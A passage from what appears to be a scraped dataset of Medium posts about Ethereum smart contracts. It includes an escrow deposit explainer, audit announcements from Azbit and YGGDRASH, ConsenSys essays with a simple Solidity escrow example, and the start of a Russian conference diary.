5\u8b93\u8cb7\u8ce3\u96d9\u65b9\u90fd\u5148\u7e73\u7d0d\u4e00\u5b9a\u7684\u4fdd\u8b49\u91d1\uff0c\u4e26\u4e14\u5728\u78ba\u8a8d\u4ea4\u6613\u5b8c\u6210\u5f8c\uff0c\u518d\u5c07\u4fdd\u8b49\u91d1\u9000\u56de\u3002\u8ddf\u8ce3\u5bb6\u6536\u4fdd\u8b49\u91d1\u662f\u70ba\u4e86\u9632\u6b62\u4ed6\u6536\u4e86\u9322\u537b\u4e0d\u51fa\u8ca8\u7b49\u539f\u56e0\u8ddf\u8cb7\u5bb6\u6536\u4fdd\u8b49\u91d1\u662f\u70ba\u4e86\u9632\u6b62\u4ed6\u6536\u5230\u8ca8\u537b\u8b0a\u7a31\u4ed6\u6c92\u6536\u5230\u7b49\u539f\u56e0\u4ee5 \u201cSafe Remote Purchase\u201d \u9019\u500b\u7bc4\u4f8b\u4f86\u8aaa\uff0c\u5047\u8a2d\u6709\u4e00\u500b\u5ee0\u5546\u4eca\u5929\u8981\u8ce3\u4e00\u53f0\u7d04 10,000 \u53f0\u5e63\u7684\u624b\u6a5f\uff0c\u9996\u5148\u8ce3\u5bb6\u8981\u5148\u5efa\u7acb\u4e00\u500b\u667a\u80fd\u5408\u7d04\uff0c\u5728\u5efa\u7acb\u5408\u7d04\u7684\u540c\u6642\u8ce3\u5bb6\u9700\u8981\u5148\u7e73\u7d0d 20,000 \u5143\u7684\u4fdd\u8b49\u91d1\uff0c\u9019\u500b\u4fdd\u8b49\u91d1\u5982\u679c\u4ea4\u6613\u6c92\u6709\u5c65\u884c\u6216\u6c92\u6709\u4eba\u8cfc\u8cb7\u6642\u53ef\u4ee5\u53d6\u6d88\uff0c\u800c\u8ce3\u5bb6\u53ef\u4ee5\u62ff\u56de\u6240\u6709\u4fdd\u8b49\u91d1\u3002\u6b64\u6642\u82e5\u6709\u4e00\u500b\u8cb7\u5bb6\u60f3\u8981\u8cb7\u9019\u652f\u624b\u6a5f\uff0c\u4ed6\u53ef\u4ee5\u900f\u904e\u667a\u80fd\u5408\u7d04\u300c\u4ed8\u6b3e\u300d\uff0c\u4f46\u8ddf\u4e00\u822c\u4ea4\u6613\u4e0d\u540c\u7684\u5730\u65b9\uff0c\u5728\u65bc\u8cb7\u5bb6\u4e5f\u9700\u8981\u4ed8\u51fa\u984d\u5916\u7684\u4fdd\u8b49\u91d1\uff0c\u5728\u9019\u500b\u4f8b\u5b50\u4ed6\u4e5f\u8981\u4ed8\u51fa 20,000 \u7684\u91d1\u984d\uff0c\u4e00\u534a\u662f\u8cfc\u8cb7\u624b\u6a5f\u7684\u8cbb\u7528\uff0c\u53e6\u4e00\u534a\u662f\u4fdd\u8b49\u91d1\u3002\u6b64\u6642\uff0c\u9019\u500b\u667a\u80fd\u5408\u7d04\u4e2d\u5df2\u7d93\u6709\u4e86 40,000 \u5143\u7684\u91d1\u984d\u3002\u63a5\u4e0b\u4f86\uff0c\u8ce3\u5bb6\u6536\u5230\u8a02\u55ae\u5f8c\u5c31\u53ef\u4ee5\u5c07\u6b64\u624b\u6a5f\u51fa\u8ca8\u7d66\u8cb7\u5bb6\u3002\u7576\u8cb7\u5bb6\u6536\u5230\u624b\u6a5f\u6642\uff0c\u4ed6\u53ef\u4ee5\u5728\u667a\u80fd\u5408\u7d04\u4e0a\u8a3b\u8a18\u300c\u5df2\u78ba\u8a8d\u6536\u5230\u7269\u54c1\u300d\u3002\u6b64\u6642\u667a\u80fd\u5408\u7d04\u78ba\u8a8d\u4e86\u6574\u500b\u4ea4\u6613\u5df2\u7d93\u5b8c\u6210\uff0c\u6703\u9000\u7d66\u8cb7\u5bb6 10,000 \u5143\u7684\u4fdd\u8b49\u91d1\uff08\u4ed6\u539f\u672c\u7e73\u4e86 20,000 \u5143\uff0c\u4e00\u534a\u662f\u8cb7\u624b\u6a5f\u7684\u8cbb\u7528\uff0c\u53e6\u5916\u4e00\u534a\u662f\u4fdd\u8b49\u91d1\uff09\uff0c\u800c\u8ce3\u5bb6\u6b64\u6642\u5247\u6703\u6536\u5230 30,000 \u7684\u6b3e\u9805\uff0c\u5176\u4e2d 20,000 \u5143\u662f\u4fdd\u8b49\u91d1\uff0c10,000 \u5143\u662f\u552e\u51fa\u624b\u6a5f\u7684\u6b3e\u9805\u3002\u6700\u5f8c\u667a\u80fd\u5408\u7d04\u5e95\u4e0b\u4e0d\u6703\u6709\u4efb\u4f55\u7d50\u9918\u6b3e\u9805\u3002\u4e0a\u8ff0\u7684\u6240\u6709\u52d5\u4f5c\u90fd\u662f\u7531\u667a\u80fd\u5408\u7d04\u4f9d\u7167\u5408\u7d04\u7684\u5167\u5bb9\u57f7\u884c\uff0c\u6240\u4ee5\u4e0d\u6703\u6709\u4e2d\u9593\u4eba\uff0c\u7576\u7136\u4e5f\u4e0d\u6703\u6709\u7121\u6cd5\u4fe1\u4efb\u4e2d\u9593\u4eba\u7684\u554f\u984c\u3002\u5728\u9019\u6a23\u7684\u667a\u80fd\u5408\u7d04\u4e0b\uff0c\u8cb7\u5bb6\u8207\u8ce3\u5bb6\u90fd\u4e0d\u6703\u8f15\u6613\u7684\u4e0d\u9001\u51fa\u5546\u54c1\u6216\u662f\u4e0d\u78ba\u8a8d\u6536\u5230\u5546\u54c1\uff0c\u56e0\u70ba\u96d9\u65b9\u90fd\u653e\u4e86\u4e00\u5b9a\u50f9\u503c\u7684\u4fdd\u8b49\u91d1\u5728\u667a\u80fd\u5408\u7d04\u4e2d\uff0c\u53ea\u6709\u96d9\u65b9\u90fd\u5c65\u884c\u4e86\u8a72\u5c65\u884c\u7684\u689d\u6587\u5f8c\u624d\u6703\u6536\u5230\u9000\u6b3e\uff0c\u800c\u9019\u6a23\u7684\u904e\u7a0b\u4e2d\u5c31\u4e0d\u9700\u8981\u6709\u76e3\u7763\u8005\u4f86\u76e3\u7763\u5408\u7d04\u662f\u5426\u9032\u884c\uff0c\u56e0\u70ba\u96d9\u65b9\u5728\u6c92\u6709\u9054\u6210\u5408\u7d04\u6642\u6b0a\u76ca\u90fd\u6703\u53d7\u640d\uff0c\u6240\u4ee5\u90fd\u6703\u5118\u91cf\u9054\u6210\u5408\u7d04\uff0c\u7576\u7136\u5be6\u969b\u7684\u4ea4\u6613\u4e0d\u6703\u662f\u9019\u9ebc\u7c21\u55ae\uff0c\u53ef\u80fd\u6703\u6709\u5f88\u591a\u9000\u6b3e\u689d\u4ef6\uff0c\u4e0d\u904e\u5f9e\u9019\u500b\u4f8b\u5b50\u4e5f\u53ef\u4ee5\u7aba\u898b\u5340\u584a\u93c8\u5728\u9019\u6a23\u7684\u5834\u666f\u6709\u4ec0\u9ebc\u61c9\u7528\u3002\u56de\u982d\u4f86\u770b\uff0c\u5176\u5be6\u9019\u6a23\u7684\u6846\u67b6\u4e5f\u53ef\u4ee5\u7528\u4efb\u4f55\u516c\u53f8\u63d0\u4f9b\u7684\u670d\u52d9\u9054\u6210\uff0c\u6bd4\u5982\u8aaa\u6709\u516c\u53f8\u63d0\u4f9b\u9019\u6a23\u4fdd\u8b49\u91d1\u67b6\u69cb\u7684\u670d\u52d9\uff0c\u4e26\u4e14\u8ca0\u8cac\u7269\u6d41\uff0c\u4e5f\u53ef\u4ee5\u9054\u6210\u540c\u6a23\u7684\u76ee\u7684\u5c0d\u5427\uff1f\u4f46\u662f\u5982\u679c\u662f\u9019\u6a23\uff0c\u554f\u984c\u53c8\u56de\u5230\u4e86\u539f\u9ede\uff1a\u4f60\u8981\u600e\u9ebc\u78ba\u8a8d\u9019\u9593\u516c\u53f8\u53ef\u4ee5\u4fe1\u4efb\uff1f\u4ed6\u4e0d\u6703\u62ff\u4e86\u5169\u65b9\u7684\u9322\u5c31\u8dd1\u8def\u4e86\uff1f\u653f\u5e9c\u662f\u4e0d\u662f\u8981\u76e3\u7763\u9019\u9593\u516c\u53f8\uff1f\u53ea\u8981\u6709\u4e2d\u9593\u4eba\uff0c\u5c31\u6703\u6709\u4fe1\u4efb\u554f\u984c\u3002Ethereum \u5340\u584a\u93c8\u4f5c\u70ba\u4e00\u500b\u53ef\u4ee5\u4fe1\u4efb\u7684\u5206\u6563\u904b\u7b97\u7db2\u8def\uff0c\u5728\u4e0d\u9700\u8981\u4e2d\u9593\u4eba\u7684\u4ecb\u5165\u4e0b\u5c31\u53ef\u4ee5\u5b8c\u6210\u9019\u6a23\u7684\u4ea4\u6613\u3002\u5269\u4e0b\u552f\u4e00\u7684\u9650\u5236\uff0c\u5c31\u662f\u4f60\u7684\u60f3\u50cf\u529b\u4e86\u00a0:-)", "responses": ""}, {"title": "Azbit Digest. Azbit Smart Contract Successfully Passed Bloxy\u00a0Audit", "author_name": "Azbit", "link": "https://medium.com/@Azbit_news/azbit-digest-azbit-smart-contract-successfully-passed-bloxy-audit-29c656b88da9?source=search_post", "post_date": "Dec 1, 2018", "readtime": "2 min read", "upvotes": "1.6K", "content": "Azbit Digest. Azbit Smart Contract Successfully Passed Bloxy\u00a0AuditAzbitBlockedUnblockFollowFollowingDec 1, 2018Azbit digest will bring you up to date with the latest news and events of Azbit project. We are glad to announce that Azbit smart contract has successfully passed the Bloxy audit!Today, the security of smart contracts is one of the most urgent problems: the \u201cgaps\u201d in security can be costly for both investors and the company itself. The world of crypto finance still remembers the story of two years ago, when the DAO investment project lost 3.6 million ETH: the hackers took advantage of an error in the code. That is why an external audit is an important step for any smart contract, because it protects the interests of both parties\u200a\u2014\u200ainvestors and companies.Why is an audit so important?- Third-party verification gives investors (including potential ones) confidence that the smart contract protects their interests.- A successful audit of a smart contract indicates that no errors were made in its code. Reliable code, in turn, doesn\u2019t allow hackers to gain access to the funds of the company and investors- When the moment of adding a token to the exchange comes, the exchange can request a startup to share the results of the audit- The availability of a successfully passed audit of a smart contract allows startups to rely on a higher rating in ICO trackers and listingsWhat is Bloxy?Bloxy is a reliable expert in blockchain analytics. Its audit is based on objective data and pure mathematics using warehouse technology. Bloxy\u2019s clients include Fintech projects, research institutes, data researchers, and the media. In particular, dashboards and graphics created by Bloxy analysts are used by such authoritative publications as Forbes and Business Insider.", "responses": "51"}, {"title": "[Announcement] New Smart Contract: Development &\u00a0Audit", "author_name": "YGGDRASH \uc774\uadf8\ub4dc\ub77c\uc2dc Official", "link": "https://medium.com/yggdrash/announcement-new-smart-contract-development-audit-92cb0425613?source=search_post", "post_date": "Jul 27, 2018", "readtime": "3 min read", "upvotes": "702", "content": "[Announcement] New Smart Contract: Development &\u00a0AuditYGGDRASH \uc774\uadf8\ub4dc\ub77c\uc2dc OfficialBlockedUnblockFollowFollowingJul 27, 2018Hello, World!Greetings from YGGDRASH.The development and audit process of the new Smart Contract has been SUCCESSFULLY COMPLETED. The purpose of the audit was to strengthen the security of YGGDRASH\u2019s new Smart Contract, and to ensure its validity for the YGGDRASH community. For these reasons, we have cooperated with SmartDec and Onther to achieve the goal.We have our confidence to announce the main checklist, the final results of process, and the partners who made this audit possible.1. Final Results:2. Audit Main Checklist:Automated tool checkManual checkReentrancyTimestamp DependenceGas Limit and LoopsDoS with (Unexpected) ThrowDoS with (Unexpected) revertDoS with Block Gas LimitTransaction-Ordering DependenceUse of tx.origin, Exception disorderGasless send, Balance equalityByte arrayTransfer forwards all gasERC20 API violationMalicious librariesCompiler version not fixedRedundant fallback functionSend instead of transferStyle guide violationUnchecked external callUnchecked mathUnsafe type inferenceImplicit visibility levelAddress hardcodedUsing delete for arraysInteger overflow/underflowLocked moneyPrivate modifierRevert/require functionsUsing varVisibilityUsing blockhashUsing SHA3Using suicideUsing throwUsing inline assemblyApprove() TransferFrom()Token Policy3. Partners:We have gone through more than 5 verification procedures with 2 reliable auditing firms such as SmartDec and Onther.", "responses": "4"}, {"title": "Unpacking the term \u2018Smart Contract\u2019", "author_name": "ConsenSys", "link": "https://medium.com/@ConsenSys/unpacking-the-term-smart-contract-e63238f7db65?source=search_post", "post_date": "Feb 10, 2016", "readtime": "5 min read", "upvotes": "66", "content": "Unpacking the term \u2018Smart Contract\u2019The word \u2018contract\u2019 and\u00a0EthereumConsenSysBlockedUnblockFollowFollowingFeb 10, 2016by Bill MarinoShould the Ethereum community stop using the words \u2018contract\u2019 and \u2018smart contract\u2019 to refer to, well, everything?When it comes to the law, \u2018contract\u2019 means something very specific: \u201ca set of promises for the breach of which the law gives a remedy\u2026\u201d[Restatement (Second) of Contracts \u00a71 (1981).]Then there\u2019s \u2018smart contract.\u2019 These days, everyone and their grandma is peddling their own definition of this. Just look here, here, and here. Heck, even I\u2019ve got one I\u2019m slingin\u2019.Some are sprawling beasts, hell-bent on assimilating anything and everything in their path\u200a\u2014\u200alike the creature in John Carpenter\u2019s The Thing. Or the suburbs. But most are pretty circumscribed and, in fact, compatible with the legal definition above\u200a\u2014\u200ajust like Nick Szabo\u2019s OG definition from 1994:\u201cA smart contract is a computerized transaction protocol that executes the terms of a contract.\u201dThen there\u2019s Ethereum. Like I said, we use \u201ccontract\u201d and \u201csmart contract\u201d for everything.The example I gave at \u00d0\u039eVCON1 is the SimpleStorage \u201csmart contract\u201d in the Solidity docs. It just stores integers. Another is Greeter, the \u201c\u2018Hello World\u2019 contract\u201d on Ethereum.org. It\u2019s just\u2026Hello World. These aren\u2019t \u201ccontracts\u201d or \u201csmart contracts\u201d under any of the definitions above (even the The Thing ones). So why call them that?I think it all stems from an (arbitrary?) decision made waaaay back in the primordial days of Ethereum: January 2014. This was the decision to label the basic building block of Ethereum\u200a\u2014\u200athat object that sits on the blockchain and has its own code, address, and balance\u200a\u2014\u200aa \u201ccontract\u201d instead of, well, anything else.If you watch Vitalik reveal Ethereum at Bitcoin Miami 2014, you\u2019ll see why I think the decision was a little arbitrary-ish.Vitalik starts off by saying that, although virtual currency was its \u201cfirst app\u201d, there are many other useful apps that could be built atop blockchain. He lists some: colored coins, DAOs, smart property, and, of course, \u201csmart contracts.\u201d And the goal of Ethereum, he says, is to create a single \u201cfoundational layer\u201d that supports them all.Then comes the big leap. As Vitalik starts to outline Ethereum\u2019s mechanics, we hear that \u201ccontract\u201d will be the label for that foundational layer\u2019s \u201clego block\u201d\u200a\u2014\u200ai.e., that core object on the blockchain. \u201cEverything that you want to implement through Ethereum,\u201d says Vitalik, \u201cyou would have to implement as a contract.\u201dBoom.I\u2019m not sure why this leap was made or why \u201ccontract\u201d\u200a\u2014\u200ashorthand for just one of the many potential blockchain apps Vitalik mentioned\u200a\u2014\u200awas chosen as the moniker for our universal \u201clego brick\u201d (instead of, say, \u201capp\u201d or \u201cprogram\u201d or even something made-up).Regardless, the name stuck. And I\u2019m no etymologist, but I think what happens next is \u201cback-formation\u201d: when people create a new word by mistakenly presuming an affix for an existing one. In this case, Ethereum users clumsily add \u201csmart\u201d back to \u201ccontract.\u201d So now \u201csmart contract\u201d has become another name for that \u201clego brick\u201d and we have folks saying things like this, from the Greeter page:\u201cSmart contracts are account holding objects on the ethereum blockchain.\u201dKind of silly, right? I think folks know this and that\u2019s why there\u2019s been a subtle effort lately to avoid \u201ccontract\u201d and \u201csmart contract\u201d in favor of more use-specific labels like \u201cDistributed Application\u201d or \u201cDAO.\u201dThis is probably a good idea. Calling something that is really just an application a \u2018contract\u2019 or \u2018smart contract\u2019 sends signals you may not want to send. You don\u2019t, for example, want users of your Hello World app to think they\u2019re incurring legal obligations by using it. That\u2019s nuts.Conversely, if something behaves more like a contract at law, then there are important practical reasons to keep calling it a \u2018contract\u2019 or \u2018smart contract.\u2019 It puts folks on notice. It says, \u201cHark! I want this thing to behave like a contract\u200a\u2014\u200ayou know, the legal kind: an enforceable agreement. So heads up.\u201dFurther\u200a\u2014\u200aand try to follow me here\u200a\u2014\u200aI think using \u2018contract\u2019 and \u2018smart contract\u2019 only for this latter category of Ethereum objects will also help us develop a set of best practices for them. Which will be really valuable.As an example\u200a\u2014\u200asomething I also mentioned at \u00d0\u039eVCON1\u200a\u2014\u200aI suspect it\u2019s possible to create Ethereum contracts that are also contracts at law (i.e., enforceable in court). You just have to make sure your Ethereum contract code reflects the elements of a contract at law.What are those? See the diagram below.How do we implement them in a contract? I\u2019m not sure.That\u2019s something we\u2019re going to have to sort out together, as a community, on Gitter and Slack and StackExchange.And while I don\u2019t know where that conversation will lead, I do know that it will be a hell of a lot easier if this topic and others like it\u200a\u2014\u200athat are only pertinent to Ethereum contracts that wish to behave like contracts at law\u200a\u2014\u200aare what come up when folks Google \u201cEthereum Contract\u201d\u200a\u2014\u200ainstead of, say, a Hello World app.In general, refining our terminology will help us refine and improve our objects.On that note, I\u2019m going to create an EIP officially proposing that we change the term for the \u201clego brick\u201d of Ethereum, that core object on the blockchain, from \u201ccontract\u201d to\u2026Snork.That\u2019s right, like the things in the cartoon. You know, the one from the 80\u2019s that was basically just Smurfs underwater. Think about it: it\u2019s retro-cool. It sounds like SNARK, so it\u2019s vaguely crypto-ish. And, above all, it\u2019s not \u201ccontract.\u201dWhat do you think? Do you have a better suggestion for a name? Are you still fine with \u201ccontract\u201d? Click through to the EIP and be heard.**This is part two of an \u201cUnpacking the Term Smart Contract\u201d series. Here is part one. **", "responses": "9"}, {"title": "Unpacking the term \u2018Smart Contract\u2019", "author_name": "ConsenSys", "link": "https://medium.com/@ConsenSys/unpacking-the-term-smart-contract-dc8ac8afc0ef?source=search_post", "post_date": "Jan 9, 2016", "readtime": "5 min read", "upvotes": "62", "content": "Unpacking the term \u2018Smart Contract\u2019From Contract to Smart Contract in\u00a0EthereumConsenSysBlockedUnblockFollowFollowingJan 9, 2016By Pelle BraendgaardSmart Contracts as defined by Nick Szabo always fascinated me. I experimented with early versions of this, but Ethereum has finally come up with what looks like the first practical implementation.This is the first in a series of articles about implementing Smart Contracts on Ethereum in the real world.What are Smart Contracts?Smart Contracts are essentially contractual clauses that execute and enforce themselves through use of code (programming code not legal code).In Ethereum a contract is a piece of code that lives on the blockchain. The contract is created as part of a transaction and run by every single node on the blockchain.The rights and right holders are stored as data and code on the blockchain itself.Rights holders can access their rights by calling functions that are predefined as part of the Smart Contract.Each function call is in itself a Ethereum transaction and the code within is also executed by every single node on the Ethereum network.A Smart Contract as defined in Ethereum is not necessarily a contract in the strict legal sense of the world, although it may be.In this article I won\u2019t get into the underlying architecture of the Ethereum blockchain, but mainly focus on Smart ContractsA simple Escrow\u00a0ContractAn Escrow is traditionally a legal contract where an agent holds funds on behalf of for example a buyer and seller.Lets say I want to buy a car from Alice. Alice lives in another city and will ship the car to me.I don\u2019t want to send the money to her without receiving the car, as I might not receive the car.Alice doesn\u2019t want to send the car to me until she receives my payment.So we\u2019re kind of stuck in a standoff. Enter a trusted third party known as the Escrow agent. These are typically lawyers, banks or specialized service providers.Now I enter into an Escrow agreement with both the agent and Alice. I send my payment to the Escrow agent Bob, who holds on to the money until I confirm I receive the car. At this point he releases the funds to Alice.I (The Buyer) hereby deposit $10,000 with Bob (the Agent) who will store it securely in his bank account until such a time that the Buyer verifies that he has received delivery of a 1996 Mazda Proteg\u00e9 (the Car) from Alice (the Seller) at which point he authorizes the Agent to disburse the entirety of the funds to the Seller. If the Seller does not deliver the Car to the Buyer by April 1st the Agent will return the entirety of his funds to the Buyer.Yes there is a bunch of other legal boiler plate involved, but that is the gist of it.First iteration of rewriting the escrow contract as a Smart\u00a0ContractSo let us create a very simple implementation of this in Solidity which has become the primary language for developing smart contracts in Ethereum.Don\u2019t worry if you\u2019re not a programmer, you won\u2019t need to understand the code to follow along:contract Escrow {   address buyer;  address seller;   address agent;     function Escrow(address _agent, address _seller) {     // In this simple example, the person sending money is the buyer and sets up the initial contract     buyer = msg.sender;     agent = _agent;     seller = _seller;   }   function release() {     if (msg.sender == agent)       suicide(seller); // Send all funds to seller     else throw;   }   function cancel() {     if (msg.sender == agent)       suicide(buyer); // Cancel escrow and return all funds to buyer        else throw;   } }Source code for Simple Escrow ContractThis contract is setup by the buyer and involves 2 other parties and allows our savvy escrow agent to either release the funds to the seller or cancel it and return funds to the seller.The Buyer creates the contract through a web app and sends it on to the network with the ethereum addresses of the agent and Seller and the amount of Ether needed to buy whatever he is buying.Ether is the primary currency on the Ethereum network, similar to how Bitcoin is the primary currency of the Bitcoin network.Ethereum allows you to create other currencies, but for now we will keep it simple.How Smart is this simple\u00a0example?So how Smart is this Smart Contract? Well, the Agent can\u2019t access the funds directly. He can only release it to the seller or return it to the buyer. That is one improvement over the traditional process.The Smart Contract doesn\u2019t mention what the conditions are for releasing or cancelling it either.The real world contract has an expiry clause. This can be implemented in Ethereum but is a little complex, so I\u2019m leaving that out for now.Why do we need an\u00a0agent?Ideally we want to get rid of the agent in a Smart Contract. We have managed to reduce trust in him by minimizing what he can do with the funds, yet it would be nice if the trigger can be released by something else.If the other side of the transaction is done entirely on the Ethereum network it is definitely possible to replace the Agent with another Smart Contract.When I start writing about implementing virtual currencies and other kinds of assets I will return to this with an agent less exchange example.Is it even a contract?Lets first look at what a contract is. According to Wikipedia:a contract (or informally known as an agreement in some jurisdictions) is an agreement having a lawful object entered into voluntarily by two or more parties, each of whom intends to create one or more legal obligations between them. The elements of a contract are \u201coffer\u201d and \u201cacceptance\u201d by \u201ccompetent persons\u201d having legal capacity who exchange \u201cconsideration\u201d to create \u201cmutuality of obligation.\u201dOn it\u2019s own our Smart Contract does not fit the above definition. The creation of the Smart Contract could be seen as an offer from the Buyer, but it does not handle acceptance of neither the agent nor the Seller.It does not even consideration of the Seller to the Buyer (delivering the car) nor Consideration to the Agent (Payment for his services).Acceptance of the smart contract by the agent could be seen as happening if he either releases or cancels the funds.None of this means that it can\u2019t work. As long as their is some out of band communication about what the actual contract is we\u2019re still good and the smart contract did it\u2019s job.The real contract could be implement as a traditional web app with the operator as the agent (like EBay), or as a dApp\u200a\u2014\u200athe term used for a new kind of distributed web application run on a combination of the web browser and Ethereum.The important part is that all parties need to understand somehow what the contract is and that the Smart Contract enforces the escrow part of it.In my next article I will cover some techniques about how to turn the above Smart Contract into a real Contract and also discuss why you might want that.Next article in series How to make sure a Smart Contract is also a Contract", "responses": "3"}, {"title": "UTN Smart Contract,", "author_name": "Alexander Borodich", "link": "https://medium.com/@borodich/utn-smart-contract-8cf0f2dad90b?source=search_post", "post_date": "Jun 17, 2018", "readtime": "6 min read", "upvotes": "1.4K", "content": "UTN Smart Contract,Alexander BorodichBlockedUnblockFollowFollowingJun 17, 2018\u0425\u0430\u043d\u0442\u044b-\u041c\u0430\u043d\u0441\u0438\u0439\u0441\u043a // \u0421\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0414\u0443\u0431\u0430\u0439\u0443\u0447\u0430\u0441\u0442\u0438\u0435 \u0432 \u043a\u043e\u043d\u0444\u0435\u0440\u0435\u043d\u0446\u0438\u0438 \u0438 \u0432\u044b\u0441\u0442\u0443\u043f\u043b\u0435\u043d\u0438\u0435 \u043f\u0440\u043e \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 Universa Blockchain \u0434\u043b\u044f \u0431\u043b\u0430\u0433\u043e\u0442\u0432\u043e\u0440\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u0444\u043e\u043d\u0434\u043e\u0432 \u0438 \u043d\u0435\u043a\u043e\u043c\u043c\u0435\u0440\u0447\u0435\u0441\u043a\u0438\u0445 \u043e\u0440\u0433\u0430\u043d\u0438\u0437\u0430\u0446\u0438\u0439 (\u0421\u0435\u0441\u0441\u0438\u044f\u200a\u2014\u200a\u0418\u043d\u043d\u043e\u0432\u0430\u0446\u0438\u0438 \u0438 \u0422\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u0438 \u0434\u043b\u044f \u0434\u0435\u0442\u0435\u0439 \u0420\u043e\u0441\u0441\u0438\u0438)\u0422\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u0438 \u0438 \u0418\u043d\u043d\u043e\u0432\u0430\u0446\u0438\u0438 \u0414\u0435\u0442\u044f\u043c\u00a0\u0420\u043e\u0441\u0441\u0438\u0438\u043f\u0435\u0440\u0435\u0433\u043e\u0432\u043e\u0440\u044b \u0441 \u0440\u0443\u043a\u043e\u0432\u043e\u0434\u0441\u0442\u0432\u043e\u043c \u0440\u0435\u0433\u0438\u043e\u043d\u0430(Deputy Governor\u200a\u2014\u200a\u0417\u0430\u0431\u043e\u0437\u043b\u0430\u0435\u0432 \u0410\u043b\u0435\u043a\u0441\u0435\u0439) \u043f\u0440\u043e \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0432\u043d\u0435\u0434\u0440\u0435\u043d\u0438\u044f \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d\u0430 \u0432 \u201c\u0421\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0414\u0443\u0431\u0430\u0439\u201d, \u043a\u0430\u043a \u0442\u0443\u0442 \u043d\u0430\u0437\u044b\u0432\u0430\u044e\u0442 \u0425\u0430\u043d\u0442\u044b-\u041c\u0430\u043d\u0441\u0438\u0439\u0441\u043a\u041f\u0440\u043e\u0447\u0438\u0442\u0430\u043b \u043b\u0435\u043a\u0446\u0438\u044e \u043f\u0440\u043e \u0442\u043e, \u043a\u0430\u043a \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d \u0438\u0437\u043c\u0435\u043d\u0438\u0442 \u043f\u0440\u043e\u0444\u0435\u0441\u0441\u0438\u0438 \u0431\u0443\u0434\u0443\u0449\u0435\u0433\u043e \u0434\u043b\u044f \u0448\u043a\u043e\u043b\u044c\u043d\u0438\u043a\u043e\u0432 \u0438 \u0441\u0442\u0443\u0434\u0435\u043d\u0442\u043e\u0432 \u0425\u041c\u0410\u041e\u041d\u043e\u0447\u043d\u044b\u0435 \u043f\u0435\u0440\u0435\u043b\u0435\u0442\u044b\u200a\u2014\u200a\u043d\u0430\u0448\u0435\u00a0\u0432\u0441\u0451\u041f\u0440\u0438\u043b\u0435\u0442\u0435\u043b\u0438 \u043e\u0431\u0440\u0430\u0442\u043d\u043e \u043d\u043e\u0447\u044c\u044e \u0438 \u0441\u0440\u0430\u0437\u0443 \u0432 \u0431\u043e\u0439 \ud83d\ude03\u0412\u0441\u0442\u0440\u0435\u0447\u0430 \u0441 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u0438\u0442\u0435\u043b\u044f\u043c\u0438 \u0433\u0440\u0443\u043f\u043f\u044b \u0430\u0440\u0430\u0431\u0441\u043a\u0438\u0445 \u0431\u0430\u043d\u043a\u043e\u0432, \u0441\u0444\u043e\u0440\u043c\u0443\u043b\u0438\u0440\u043e\u0432\u0430\u043b\u0438 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u043e\u0441\u0442\u0438 \u0438 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u044b \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b. \u0414\u043e\u0433\u043e\u0432\u043e\u0440\u0438\u043b\u0438\u0441\u044c \u0432\u044b\u0441\u0442\u0443\u043f\u0438\u0442\u044c \u0432 \u041f\u0430\u0440\u0438\u0436\u0435 \u043d\u0430 \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u0438\u0437\u0438\u0440\u043e\u0432\u0430\u043d\u043d\u043e\u043c \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u043e\u043c \u0444\u043e\u0440\u0443\u043c\u0435 \u0432 \u043a\u043e\u043d\u0446\u0435 \u0438\u044e\u043d\u044f.\u0412\u0441\u0442\u0440\u0435\u0447\u0430 \u0441 \u0421\u0435\u0440\u0433\u0435\u0435\u043c \u0411\u0435\u0437\u0434\u0435\u043b\u043e\u0432\u044b\u043c \u0438 \u0410\u041d\u041e \u0420\u0435\u0439\u0442\u0438\u043d\u0433\u043e\u0432\u043e\u0435 \u0430\u0433\u0435\u043d\u0442\u0441\u0442\u0432\u043e \u043e\u0446\u0435\u043d\u043a\u0438 \u043f\u0440\u043e\u0435\u043a\u0442\u043e\u0432 \u0446\u0438\u0444\u0440\u043e\u0432\u043e\u0439 \u044d\u043a\u043e\u043d\u043e\u043c\u0438\u043a\u0438 (http://reurating.ru). \u041e\u0431\u0441\u0443\u0436\u0434\u0435\u043d\u0438\u0435 \u0432\u0430\u0440\u0438\u0430\u043d\u0442\u043e\u0432 \u0441\u043e\u0432\u043c\u0435\u0441\u0442\u043d\u043e\u0439 \u0440\u0430\u0431\u043e\u0442\u044b \u0438 \u0443\u0447\u0430\u0441\u0442\u0438\u044f Universa Blockchain \u0432 \u0440\u0430\u0431\u043e\u0442\u0435 \u0430\u0433\u0435\u043d\u0442\u0441\u0442\u0432\u0430.\u0412\u0441\u0442\u0440\u0435\u0447\u0430 c \u0414\u0435\u043d\u0438\u0441\u043e\u043c \u0411\u0443\u043a\u043e, \u0440\u0443\u043a\u043e\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u0435\u043c AMBD.io(http://ambd.io), \u043e\u0431\u0441\u0443\u0436\u0434\u0430\u043b\u0438 \u0431\u0443\u0434\u0443\u0449\u0435\u0435 \u0440\u044b\u043d\u043a\u0430 ICO \u0438 \u043f\u043e\u043c\u043e\u0449\u044c \u043f\u0440\u043e\u0435\u043a\u0442\u0430\u043c, \u0432\u044b\u0445\u043e\u0434\u044f\u0449\u0438\u043c \u043d\u0430 ICO \u0441\u043e \u0441\u0442\u043e\u0440\u043e\u043d\u044b Universa, \u043a\u0430\u043a \u043f\u0440\u043e\u0432\u0430\u0439\u0434\u0435\u0440\u0430 \u0431\u043b\u043e\u043a\u0447\u0435\u0439\u043d \u0442\u0435\u0445\u043d\u043e\u043b\u043e\u0433\u0438\u0438\u041f\u0440\u0438\u0435\u043c \u0443 \u041f\u043e\u0441\u043b\u0430 